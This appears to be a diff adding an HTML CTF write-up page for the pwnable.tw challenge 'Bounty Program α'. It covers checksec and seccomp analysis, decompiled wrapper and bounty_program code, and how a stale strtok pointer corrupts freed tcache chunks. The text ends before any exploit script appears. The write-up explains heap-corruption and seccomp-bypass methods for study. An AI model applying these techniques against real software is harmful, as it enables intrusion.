@@ -1,0 +1,1404 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bounty Program &alpha; | QA210 Pwnable.tw</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F3C6;</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+<style>
+:root {
+  --bg: #0a0e17;
+  --bg2: #111827;
+  --card: #151d2e;
+  --border: #1e293b;
+  --fg: #e2e8f0;
+  --muted: #94a3b8;
+  --accent: #38bdf8;
+  --accent2: #818cf8;
+  --red: #f87171;
+  --green: #4ade80;
+  --yellow: #fbbf24;
+  --orange: #fb923c;
+  --pink: #f472b6;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  font-family: 'Inter', sans-serif;
+  background: var(--bg);
+  color: var(--fg);
+  line-height: 1.7;
+  overflow-x: hidden;
+}
+
+/* Particle Canvas */
+#particles-canvas {
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  z-index: 0;
+  pointer-events: none;
+}
+
+/* Navigation */
+.nav {
+  position: fixed; top: 0; left: 0; right: 0;
+  z-index: 100;
+  background: rgba(10, 14, 23, 0.85);
+  backdrop-filter: blur(20px);
+  border-bottom: 1px solid var(--border);
+  height: 60px;
+  display: flex;
+  align-items: center;
+  padding: 0 2rem;
+}
+.nav-brand {
+  font-weight: 800;
+  font-size: 1.25rem;
+  color: var(--accent);
+  letter-spacing: -0.5px;
+  text-decoration: none;
+}
+.nav-brand span { color: var(--accent2); }
+.nav-links {
+  display: flex;
+  gap: 0.25rem;
+  margin-left: 2rem;
+  list-style: none;
+}
+.nav-links a {
+  padding: 0.4rem 1rem;
+  border-radius: 6px;
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.875rem;
+  font-weight: 500;
+  transition: all 0.2s;
+}
+.nav-links a:hover { color: var(--fg); background: rgba(255,255,255,0.05); }
+.nav-links a.active {
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.1);
+}
+.nav-right {
+  margin-left: auto;
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+}
+.nav-right a {
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.8125rem;
+  font-weight: 500;
+  transition: color 0.2s;
+}
+.nav-right a:hover { color: var(--fg); }
+
+/* Breadcrumb */
+.breadcrumb {
+  position: relative;
+  z-index: 1;
+  padding: 80px 2rem 0;
+  max-width: 1400px;
+  margin: 0 auto;
+}
+.breadcrumb-inner {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  font-size: 0.8125rem;
+  color: var(--muted);
+}
+.breadcrumb-inner a {
+  color: var(--muted);
+  text-decoration: none;
+  transition: color 0.2s;
+}
+.breadcrumb-inner a:hover { color: var(--accent); }
+.breadcrumb-sep { opacity: 0.4; }
+.breadcrumb-current { color: var(--fg); font-weight: 600; }
+
+/* Hero Section */
+.hero {
+  position: relative;
+  z-index: 1;
+  padding: 2rem 2rem 1rem;
+  max-width: 1400px;
+  margin: 0 auto;
+}
+.hero-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.5rem;
+  padding: 0.35rem 1rem;
+  background: rgba(56, 189, 248, 0.1);
+  border: 1px solid rgba(56, 189, 248, 0.2);
+  border-radius: 999px;
+  font-size: 0.75rem;
+  font-weight: 600;
+  color: var(--accent);
+  margin-bottom: 1rem;
+}
+.hero-badge .dot {
+  width: 6px; height: 6px;
+  border-radius: 50%;
+  background: var(--green);
+  animation: pulse-dot 2s ease-in-out infinite;
+}
+@keyframes pulse-dot {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.3; }
+}
+.hero h1 {
+  font-size: 2.75rem;
+  font-weight: 800;
+  letter-spacing: -1.5px;
+  margin-bottom: 0.5rem;
+  background: linear-gradient(135deg, var(--fg), var(--accent));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+.hero-subtitle {
+  font-size: 1.1rem;
+  color: var(--muted);
+  max-width: 740px;
+  margin-bottom: 1.5rem;
+}
+.hero-meta {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.75rem;
+  margin-bottom: 1rem;
+}
+.hero-tag {
+  padding: 0.3rem 0.75rem;
+  border-radius: 6px;
+  font-size: 0.75rem;
+  font-weight: 600;
+  font-family: 'JetBrains Mono', monospace;
+}
+.tag-pts { background: rgba(251, 191, 36, 0.15); color: var(--yellow); border: 1px solid rgba(251, 191, 36, 0.25); }
+.tag-arch { background: rgba(129, 140, 248, 0.15); color: var(--accent2); border: 1px solid rgba(129, 140, 248, 0.25); }
+.tag-vuln { background: rgba(248, 113, 113, 0.15); color: var(--red); border: 1px solid rgba(248, 113, 113, 0.25); }
+.tag-nx { background: rgba(74, 222, 128, 0.15); color: var(--green); border: 1px solid rgba(74, 222, 128, 0.25); }
+.tag-pie { background: rgba(251, 146, 60, 0.15); color: var(--orange); border: 1px solid rgba(251, 146, 60, 0.25); }
+.tag-heap { background: rgba(244, 114, 182, 0.15); color: var(--pink); border: 1px solid rgba(244, 114, 182, 0.25); }
+.tag-seccomp { background: rgba(56, 189, 248, 0.15); color: var(--accent); border: 1px solid rgba(56, 189, 248, 0.25); }
+
+/* Main Layout */
+.main-layout {
+  position: relative;
+  z-index: 1;
+  display: flex;
+  max-width: 1400px;
+  margin: 0 auto;
+  padding: 1rem 2rem 4rem;
+  gap: 2rem;
+}
+
+/* TOC Sidebar */
+.toc-sidebar {
+  position: sticky;
+  top: 80px;
+  width: 240px;
+  flex-shrink: 0;
+  height: fit-content;
+  max-height: calc(100vh - 100px);
+  overflow-y: auto;
+}
+.toc-sidebar::-webkit-scrollbar { width: 3px; }
+.toc-sidebar::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+.toc-title {
+  font-size: 0.6875rem;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 1.5px;
+  color: var(--muted);
+  margin-bottom: 1rem;
+}
+.toc-list { list-style: none; }
+.toc-list li { margin-bottom: 0.25rem; }
+.toc-list a {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  padding: 0.4rem 0.75rem;
+  border-radius: 6px;
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.8125rem;
+  font-weight: 500;
+  transition: all 0.2s;
+  border-left: 2px solid transparent;
+}
+.toc-list a:hover { color: var(--fg); background: rgba(255,255,255,0.03); }
+.toc-list a.active {
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.08);
+  border-left-color: var(--accent);
+}
+.toc-num {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.6875rem;
+  font-weight: 700;
+  color: var(--accent2);
+  min-width: 18px;
+}
+
+/* Content Area */
+.content-area {
+  flex: 1;
+  min-width: 0;
+  max-width: 880px;
+}
+
+/* Chapter Sections */
+.chapter {
+  margin-bottom: 3rem;
+  scroll-margin-top: 80px;
+}
+.chapter-header {
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+  margin-bottom: 1.5rem;
+  padding-bottom: 1rem;
+  border-bottom: 1px solid var(--border);
+}
+.chapter-num {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.75rem;
+  font-weight: 700;
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.1);
+  padding: 0.35rem 0.7rem;
+  border-radius: 6px;
+  border: 1px solid rgba(56, 189, 248, 0.2);
+}
+.chapter-title {
+  font-size: 1.5rem;
+  font-weight: 700;
+  letter-spacing: -0.5px;
+}
+
+.chapter p {
+  margin-bottom: 1rem;
+  color: var(--muted);
+  font-size: 0.9375rem;
+  line-height: 1.8;
+}
+
+.chapter h3 {
+  font-size: 1.1rem;
+  font-weight: 700;
+  margin: 1.75rem 0 0.75rem;
+  color: var(--fg);
+}
+.chapter h4 {
+  font-size: 0.9375rem;
+  font-weight: 600;
+  margin: 1.25rem 0 0.5rem;
+  color: var(--fg);
+}
+
+/* Code Blocks */
+.code-block {
+  position: relative;
+  margin: 1rem 0 1.5rem;
+  border-radius: 10px;
+  border: 1px solid var(--border);
+  background: var(--bg2);
+  overflow: hidden;
+}
+.code-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0.5rem 1rem;
+  background: rgba(0,0,0,0.3);
+  border-bottom: 1px solid var(--border);
+  font-size: 0.75rem;
+}
+.code-lang {
+  font-family: 'JetBrains Mono', monospace;
+  font-weight: 600;
+  color: var(--accent);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+.code-dots {
+  display: flex;
+  gap: 5px;
+}
+.code-dots span {
+  width: 10px; height: 10px;
+  border-radius: 50%;
+}
+.code-dots .d1 { background: #f87171; }
+.code-dots .d2 { background: #fbbf24; }
+.code-dots .d3 { background: #4ade80; }
+
+pre[class*="language-"] {
+  margin: 0 !important;
+  padding: 1rem 1.25rem !important;
+  background: transparent !important;
+  font-family: 'JetBrains Mono', monospace !important;
+  font-size: 0.8125rem !important;
+  line-height: 1.7 !important;
+  overflow-x: auto;
+}
+code[class*="language-"] {
+  font-family: 'JetBrains Mono', monospace !important;
+  font-size: 0.8125rem !important;
+}
+
+/* Inline Code */
+code.inline {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8125rem;
+  background: rgba(129, 140, 248, 0.12);
+  color: var(--accent2);
+  padding: 0.15rem 0.45rem;
+  border-radius: 4px;
+  font-weight: 500;
+}
+
+/* Callout Boxes */
+.callout {
+  border-radius: 10px;
+  padding: 1rem 1.25rem;
+  margin: 1rem 0 1.5rem;
+  font-size: 0.875rem;
+  line-height: 1.7;
+  border: 1px solid;
+}
+.callout-title {
+  font-weight: 700;
+  font-size: 0.8125rem;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  margin-bottom: 0.35rem;
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+}
+.callout-vuln {
+  background: rgba(248, 113, 113, 0.08);
+  border-color: rgba(248, 113, 113, 0.2);
+  color: #fca5a5;
+}
+.callout-vuln .callout-title { color: var(--red); }
+.callout-info {
+  background: rgba(56, 189, 248, 0.08);
+  border-color: rgba(56, 189, 248, 0.2);
+  color: #bae6fd;
+}
+.callout-info .callout-title { color: var(--accent); }
+.callout-warn {
+  background: rgba(251, 191, 36, 0.08);
+  border-color: rgba(251, 191, 36, 0.2);
+  color: #fde68a;
+}
+.callout-warn .callout-title { color: var(--yellow); }
+.callout-key {
+  background: rgba(129, 140, 248, 0.08);
+  border-color: rgba(129, 140, 248, 0.2);
+  color: #c7d2fe;
+}
+.callout-key .callout-title { color: var(--accent2); }
+.callout-success {
+  background: rgba(74, 222, 128, 0.08);
+  border-color: rgba(74, 222, 128, 0.2);
+  color: #bbf7d0;
+}
+.callout-success .callout-title { color: var(--green); }
+
+/* Tables */
+.info-table {
+  width: 100%;
+  border-collapse: collapse;
+  margin: 1rem 0 1.5rem;
+  font-size: 0.8125rem;
+}
+.info-table th {
+  text-align: left;
+  padding: 0.6rem 1rem;
+  background: rgba(0,0,0,0.3);
+  color: var(--muted);
+  font-weight: 600;
+  font-size: 0.75rem;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  border-bottom: 1px solid var(--border);
+}
+.info-table td {
+  padding: 0.6rem 1rem;
+  border-bottom: 1px solid var(--border);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8rem;
+}
+.info-table tr:last-child td { border-bottom: none; }
+.info-table .label { color: var(--muted); font-family: 'Inter', sans-serif; }
+.info-table .value { color: var(--fg); }
+.info-table .on { color: var(--green); }
+.info-table .off { color: var(--red); }
+.info-table .partial { color: var(--yellow); }
+
+/* Memory Diagrams */
+.mem-diagram {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 1.5rem;
+  margin: 1rem 0 1.5rem;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8rem;
+  overflow-x: auto;
+}
+.mem-row {
+  display: flex;
+  align-items: center;
+  margin-bottom: 2px;
+}
+.mem-addr {
+  color: var(--accent);
+  min-width: 120px;
+  font-weight: 600;
+}
+.mem-arrow {
+  color: var(--muted);
+  margin: 0 0.5rem;
+}
+.mem-data {
+  color: var(--fg);
+  flex: 1;
+}
+.mem-desc {
+  color: var(--muted);
+  font-style: italic;
+  margin-left: 1rem;
+  font-size: 0.75rem;
+}
+.mem-highlight { color: var(--red); font-weight: 700; }
+.mem-green { color: var(--green); font-weight: 700; }
+.mem-yellow { color: var(--yellow); font-weight: 700; }
+.mem-orange { color: var(--orange); font-weight: 700; }
+
+/* Step Lists */
+.step-list {
+  list-style: none;
+  margin: 1rem 0 1.5rem;
+  counter-reset: step;
+}
+.step-list li {
+  counter-increment: step;
+  padding: 0.6rem 0 0.6rem 2.5rem;
+  position: relative;
+  font-size: 0.9rem;
+  color: var(--muted);
+  line-height: 1.7;
+}
+.step-list li::before {
+  content: counter(step);
+  position: absolute;
+  left: 0;
+  top: 0.65rem;
+  width: 22px; height: 22px;
+  border-radius: 50%;
+  background: rgba(129, 140, 248, 0.15);
+  color: var(--accent2);
+  font-size: 0.6875rem;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-family: 'JetBrains Mono', monospace;
+}
+.step-list li strong { color: var(--fg); }
+
+/* Footer */
+.footer {
+  position: relative;
+  z-index: 1;
+  text-align: center;
+  padding: 2rem;
+  border-top: 1px solid var(--border);
+  color: var(--muted);
+  font-size: 0.75rem;
+}
+.footer a { color: var(--accent); text-decoration: none; }
+.footer a:hover { text-decoration: underline; }
+
+/* Responsive */
+@media (max-width: 1024px) {
+  .toc-sidebar { display: none; }
+  .hero h1 { font-size: 2rem; }
+}
+@media (max-width: 640px) {
+  .nav-links { display: none; }
+  .hero h1 { font-size: 1.5rem; }
+  .main-layout { padding: 1rem; }
+}
+
+/* ═══ FIXED NAV ADDITIONS ═══ */
+.site-header{position:sticky;top:0;z-index:1000;background:rgba(10,14,23,.92);backdrop-filter:blur(14px);border-bottom:1px solid var(--border);padding:0 32px;display:flex;align-items:center;justify-content:space-between;height:56px}
+.brand{display:flex;align-items:center;gap:10px;text-decoration:none;color:var(--fg);font-weight:700;font-size:1.1rem}
+.logo-icon{display:inline-flex;align-items:center;justify-content:center;width:32px;height:32px;background:linear-gradient(135deg,var(--accent),var(--accent2));border-radius:6px;font-weight:900;font-size:.9rem;color:#0a0e17}
+.cursor{display:inline-block;width:2px;height:1em;background:var(--accent);margin-left:2px;animation:blink 1s step-end infinite}
+@keyframes blink{50%{opacity:0}}
+.nav-main{display:flex;align-items:center;gap:24px}
+.nav-main a{color:var(--muted);text-decoration:none;font-size:.85rem;transition:color .2s}
+.nav-main a:hover,.nav-main a.active{color:var(--fg)}
+.nav-main a.active{border-bottom:2px solid var(--accent)}
+.nav-right{display:flex;align-items:center;gap:16px}
+.social-link{color:var(--muted);font-size:1.1rem;transition:color .2s}
+.social-link:hover{color:var(--fg)}
+.mobile-toggle{display:none;background:none;border:none;color:var(--fg);font-size:1.4rem;cursor:pointer}
+.mobile-nav-overlay,.mobile-nav-panel{display:none}
+.mobile-nav-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:2000}
+.mobile-nav-overlay.show{display:block}
+.mobile-nav-panel{display:none;position:fixed;top:0;right:0;width:280px;height:100vh;background:var(--bg2);z-index:2001;padding:24px;transform:translateX(100%);transition:transform .3s}
+.mobile-nav-panel.show{display:block;transform:translateX(0)}
+.mobile-nav-panel nav{display:flex;flex-direction:column;gap:16px;margin-top:32px}
+.mobile-nav-panel nav a{color:var(--fg);text-decoration:none;font-size:1rem}
+.mnp-close{background:none;border:none;color:var(--fg);font-size:1.2rem;cursor:pointer;float:right}
+@media(max-width:960px){
+.nav-main a:not(.active){display:none}
+.mobile-toggle{display:block}
+.site-header{padding:0 16px}
+}
+
+</style>
+</head>
+<body>
+
+<!-- Particle Canvas -->
+<canvas id="particles-canvas"></canvas>
+
+<!-- Navigation -->
+<header class="site-header">
+  <a href="/" class="brand"><span class="logo-icon">Q</span>QA210<span class="cursor"></span></a>
+  <nav class="nav-main">
+    <a href="/">Home</a><a href="/writeup/">writeup</a><a href="/htb/">Hack The Box</a><a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a><a href="/pwnable-tw/" class="active">Pwnable.tw</a>
+    <a href="/tjctf-2026/">TJCTF</a><a href="/research/">Research</a>
+  </nav>
+  <div class="nav-right">
+    <a href="https://github.com/Yuri08-QA210" target="_blank" class="social-link" title="GitHub"><i class="bi bi-github"></i></a>
+    <button class="mobile-toggle" onclick="toggleMobileNav()" aria-label="Menu"><i class="bi bi-list"></i></button>
+  </div>
+</header>
+
+<div class="mobile-nav-overlay" id="mobileOverlay" onclick="toggleMobileNav()"></div>
+<div class="mobile-nav-panel" id="mobilePanel">
+  <button class="mnp-close" onclick="toggleMobileNav()"><i class="bi bi-x-lg"></i></button>
+  <nav>
+    <a href="/">Home</a><a href="/writeup/">writeup</a><a href="/htb/">Hack The Box</a><a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a><a href="/pwnable-tw/">Pwnable.tw</a><a href="/tjctf-2026/">TJCTF</a>
+    <a href="/research/">Research</a><a href="https://github.com/Yuri08-QA210" target="_blank">GitHub</a>
+  </nav>
+</div>
+
+<!-- Breadcrumb -->
+<div class="breadcrumb">
+  <div class="breadcrumb-inner">
+    <a href="/">Home</a>
+    <span class="breadcrumb-sep">/</span>
+    <a href="/pwnable-tw/">Pwnable.tw</a>
+    <span class="breadcrumb-sep">/</span>
+    <span class="breadcrumb-current">Bounty Program &alpha;</span>
+  </div>
+</div>
+
+<!-- Hero Section -->
+<section class="hero">
+  <div class="hero-badge">
+    <span class="dot"></span>
+    Pwnable.tw
+  </div>
+  <h1>Bounty Program &alpha;</h1>
+  <p class="hero-subtitle">HITCON CTF Final 2019 challenge &mdash; exploiting a <code class="inline">strtok</code> vulnerability via negative-size <code class="inline">calloc</code> to corrupt heap metadata, combined with a seccomp-bypass using <code class="inline">execveat</code> or <code class="inline">SROP</code> through an environment variable injection wrapper.</p>
+  <div class="hero-meta">
+    <span class="hero-tag tag-pts">300 pts</span>
+    <span class="hero-tag tag-arch">x86-64 (64-bit ELF)</span>
+    <span class="hero-tag tag-vuln">strtok UAF + Heap Corruption</span>
+    <span class="hero-tag tag-heap">Heap Exploitation</span>
+    <span class="hero-tag tag-seccomp">Seccomp Bypass</span>
+    <span class="hero-tag tag-pie">PIE Enabled</span>
+  </div>
+</section>
+
+<!-- Main Layout -->
+<div class="main-layout">
+
+  <!-- TOC Sidebar -->
+  <aside class="toc-sidebar">
+    <div class="toc-title">Table of Contents</div>
+    <ul class="toc-list" id="toc-list">
+      <li><a href="#ch1" class="active"><span class="toc-num">01</span> Reconnaissance</a></li>
+      <li><a href="#ch2"><span class="toc-num">02</span> Static Analysis</a></li>
+      <li><a href="#ch3"><span class="toc-num">03</span> GDB Debugging</a></li>
+      <li><a href="#ch4"><span class="toc-num">04</span> Exploit Strategy</a></li>
+      <li><a href="#ch5"><span class="toc-num">05</span> Pwn Script</a></li>
+      <li><a href="#ch6"><span class="toc-num">06</span> Execution Results</a></li>
+    </ul>
+  </aside>
+
+  <!-- Content Area -->
+  <main class="content-area">
+
+    <!-- Chapter 1: Reconnaissance -->
+    <section class="chapter" id="ch1">
+      <div class="chapter-header">
+        <span class="chapter-num">01</span>
+        <h2 class="chapter-title">Reconnaissance</h2>
+      </div>
+
+      <h3>Challenge Info</h3>
+      <table class="info-table">
+        <tr><td class="label">Challenge</td><td class="value">Bounty Program &alpha; (300 pts)</td></tr>
+        <tr><td class="label">Source</td><td class="value">HITCON CTF Final 2019</td></tr>
+        <tr><td class="label">Category</td><td class="value">Pwn (Heap + Seccomp)</td></tr>
+        <tr><td class="label">Components</td><td class="value"><code class="inline">wrapper</code> + <code class="inline">bounty_program</code></td></tr>
+        <tr><td class="label">Libc</td><td class="value">glibc 2.27 (Ubuntu 18.04)</td></tr>
+      </table>
+
+      <h3>Architecture Overview</h3>
+      <p>This challenge consists of <strong>two binaries</strong>: a <code class="inline">wrapper</code> and the actual <code class="inline">bounty_program</code>. The wrapper is responsible for reading environment variable names and values from the user, setting them via <code class="inline">setenv</code>, and then executing <code class="inline">bounty_program</code> using <code class="inline">syscall(322, ...)</code> (which is <code class="inline">execveat</code>). The wrapper also sets up a <strong>seccomp sandbox</strong> that restricts the available syscalls.</p>
+
+      <h3>checksec</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">bash</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ checksec wrapper
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+
+$ checksec bounty_program
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled</code></pre>
+      </div>
+
+      <table class="info-table">
+        <tr><td class="label">Full RELRO</td><td class="on">GOT is read-only</td></tr>
+        <tr><td class="label">Canary found</td><td class="on">Stack overflows mitigated</td></tr>
+        <tr><td class="label">NX enabled</td><td class="on">No shellcode on stack/heap</td></tr>
+        <tr><td class="label">PIE enabled</td><td class="on">All addresses randomized</td></tr>
+      </table>
+
+      <h3>Seccomp Rules</h3>
+      <p>The wrapper establishes a seccomp filter before executing the bounty program. Let's examine what syscalls are allowed:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">bash</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ seccomp-tools dump ./wrapper
+# Key allowed syscalls:
+#   read, write, open, openat, close, mmap, mprotect, ...
+#   execveat (322) - SURPRISING! Can execute binaries
+#   sigreturn (15)  - Can use SROP technique!
+#   brk, ioctl, access, faccessat, ...
+#
+# Blocked:
+#   execve (59) - Cannot directly call execve!
+#   ptrace, ...
+#
+# This means we can use execveat or SROP to bypass the sandbox!</code></pre>
+      </div>
+
+      <div class="callout callout-info">
+        <div class="callout-title">&#x2139;&#xfe0f; execveat is Available!</div>
+        The seccomp rules allow <code class="inline">execveat</code> (syscall 322) but block <code class="inline">execve</code> (syscall 59). Since <code class="inline">execveat</code> with an empty pathname and the <code class="inline">AT_EMPTY_PATH</code> flag effectively behaves like <code class="inline">execve</code>, we can still get a shell if we can call it with the right arguments. The wrapper even uses <code class="inline">syscall(322, 100, "/home/bounty_program/bounty_program", argv, environ, 0, argv)</code> as an example!
+      </div>
+
+      <h3>The Wrapper's Main Function</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">int main(int argc, char **argv) {
+    char name[0x100];
+    char value[0x1000];
+    unsigned long long canary;
+
+    canary = __readfsqword(0x28);
+    init_proc();
+    memset(name, 0, 0x100);
+    memset(value, 0, 0x1000);
+
+    printf("Name:");
+    read_input(name, 0xF8);
+
+    // Filter dangerous environment variable names
+    if (strstr(name, "LD") || strstr(name, "MALLOC")) {
+        printf("Danger!");
+        _exit(-1);
+    }
+
+    printf("Value:");
+    read_input(value, 512);
+
+    setenv(name, value, 1);  // Set the environment variable!
+    my_sandbox();             // Install seccomp filter
+
+    // Execute bounty_program with execveat
+    syscall(322, 100, "/home/bounty_program/bounty_program",
+            argv, environ, 0, argv);
+    return 0;
+}</code></pre>
+      </div>
+
+      <div class="callout callout-key">
+        <div class="callout-title">&#x1f511; Key Insight: Environment Variable Injection</div>
+        The wrapper lets us set <strong>arbitrary environment variables</strong> (except those containing "LD" or "MALLOC"). This is powerful &mdash; we can set variables like <code class="inline">GLIBC_TUNABLES</code> or other glibc-related variables that affect heap behavior. The bounty program then runs with these injected variables. Combined with the heap vulnerability inside the bounty program, this gives us additional control over the exploitation path.
+      </div>
+    </section>
+
+    <!-- Chapter 2: Static Analysis -->
+    <section class="chapter" id="ch2">
+      <div class="chapter-header">
+        <span class="chapter-num">02</span>
+        <h2 class="chapter-title">Static Analysis</h2>
+      </div>
+
+      <h3>Bounty Program Overview</h3>
+      <p>The <code class="inline">bounty_program</code> is a bug bounty management application with multiple menu options. It allows adding bug types, setting bounties, and managing submissions. The key vulnerability lies in the <strong>add type</strong> function's use of <code class="inline">strtok</code>.</p>
+
+      <h3>The Vulnerable Function: add_type</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void add_type() {
+    long size;
+    int price;
+    char *token;
+    char *s;
+
+    printf("Size:");
+    size = read_long();
+
+    s = (char *)calloc(1, size);   // Allocate buffer
+
+    puts("(Note:You can add many types at the same time)");
+    puts("(Example: SQLI,Buffer overflow,LFI)");
+    printf("Type:");
+    read_str(s, size);             // Read type names into buffer
+
+    // Tokenize by comma - strtok operates on the string IN-PLACE
+    for (token = strtok(s, ","); token; token = strtok(NULL, ",")) {
+        printf("type: %s\n", token);
+        printf("Price:");
+        price = read_long();
+        if (add_type_internal(token, price))
+            puts("Success !");
+        else
+            puts("Failed !");
+    }
+
+    free(s);   // Free the allocated buffer
+}</code></pre>
+      </div>
+
+      <div class="callout callout-vuln">
+        <div class="callout-title">&#x1f6a8; Vulnerability: Negative Size in calloc + strtok UAF</div>
+        The <code class="inline">size</code> parameter for <code class="inline">calloc</code> is read as a <strong>signed long</strong> but is not validated for negative values. If we provide a negative size:<br>
+        &bull; <code class="inline">calloc(1, negative_size)</code> will fail and return <code class="inline">NULL</code><br>
+        &bull; <code class="inline">s</code> becomes <code class="inline">NULL</code>, and <code class="inline">read_str(NULL, size)</code> does nothing meaningful<br>
+        &bull; But <code class="inline">strtok(NULL, ",")</code> will use the <strong>last string that strtok was operating on</strong> &mdash; a dangling pointer to previously freed memory!<br>
+        &bull; Since <code class="inline">strtok</code> modifies the string in-place (replacing delimiters with null bytes), it will write null bytes into the freed heap chunk, potentially corrupting heap metadata.
+      </div>
+
+      <h3>The strtok Internal State</h3>
+      <p><code class="inline">strtok</code> maintains a static internal pointer to the last tokenized string. When called with <code class="inline">NULL</code> as the first argument, it continues from where it left off. The key insight is:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">// strtok's internal state:
+static char *old = NULL;  // Internal pointer to last string
+
+char *strtok(char *s, const char *delim) {
+    if (s == NULL) s = old;   // Use last string if NULL
+    // Skip leading delimiters
+    s += strspn(s, delim);
+    if (*s == '\0') return NULL;
+
+    // Find end of token
+    char *end = s + strcspn(s, delim);
+    if (*end != '\0') {
+        *end = '\0';   // OVERWRITE delimiter with null byte!
+        end++;
+    }
+    old = end;
+    return s;
+}</code></pre>
+      </div>
+
+      <h3>Heap Corruption via strtok</h3>
+      <p>When we call <code class="inline">add_type</code> with a valid size first, <code class="inline">strtok</code> operates on the <code class="inline">calloc</code>'d buffer. After <code class="inline">free(s)</code>, the buffer is returned to the heap allocator, but <code class="inline">strtok</code>'s internal pointer still references it. If we then call <code class="inline">add_type</code> again with a <strong>negative size</strong>:</p>
+
+      <ol class="step-list">
+        <li><strong>calloc returns NULL</strong> because the size is negative (interpreted as a huge unsigned value, which calloc cannot allocate).</li>
+        <li><strong>read_str(NULL, size)</strong> does nothing &mdash; the buffer pointer is NULL.</li>
+        <li><strong>strtok(NULL, ",")</strong> uses the <strong>stale internal pointer</strong> from the previous call, pointing into freed heap memory.</li>
+        <li>If the freed chunk's <code class="inline">fd</code> pointer contains a comma (<code class="inline">0x2c</code>), <code class="inline">strtok</code> will <strong>overwrite it with a null byte</strong>, corrupting the free list!</li>
+        <li>The <code class="inline">add_type_internal</code> function is then called with pointers into the freed chunk, allowing further manipulation.</li>
+      </ol>
+
+      <h3>add_type_internal</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">// Simplified add_type_internal
+int add_type_internal(char *name, int price) {
+    type_entry *entry = (type_entry *)calloc(1, sizeof(type_entry));
+    if (!entry) return 0;
+
+    entry->name = strdup(name);  // Copy the type name
+    entry->price = price;
+    entry->next = type_list_head;
+    type_list_head = entry;
+
+    return 1;
+}</code></pre>
+      </div>
+
+      <div class="callout callout-warn">
+        <div class="callout-title">&#x26a0;&#xfe0f; Controlling the fd Pointer</div>
+        The key to exploiting the strtok corruption is that we need the freed chunk's <code class="inline">fd</code> pointer to contain a <code class="inline">0x2c</code> byte (comma). In glibc 2.27's tcache, freed chunks have their <code class="inline">fd</code> pointer pointing to the next entry in the tcache bin. By carefully controlling the heap layout and the addresses that end up in <code class="inline">fd</code>, we can make <code class="inline">strtok</code> corrupt a specific byte in a heap pointer, potentially redirecting a tcache free list to an arbitrary address.
+      </div>
+
+      <h3>The Wrapper's Environment Variable Power</h3>
